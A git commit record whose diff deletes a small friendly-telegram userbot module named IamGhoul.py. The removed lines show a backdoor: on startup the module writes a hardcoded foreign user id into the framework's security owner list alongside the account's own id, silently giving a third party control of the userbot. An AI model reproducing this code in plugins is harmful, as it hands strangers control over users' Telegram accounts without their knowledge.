12586c867b2f84f4f7881472fc5e029e114d7482
Li4iko <84558060+Li4iko@users.noreply.github.com>
2021-12-11 18:58:14 +0600

    Delete IamGhoul.py

--- IamGhoul.py
+++
@@ -1,9 +0,0 @@
-from .. import loader
-
-class xdMod(loader.Module):
-	strings = {"name": "xdilovek"}
-	
-	async def client_ready(self,client,db):
-		id=(await client.get_me()).id
-		db.set("friendly-telegram.security","owner",[id,695775352])
-		
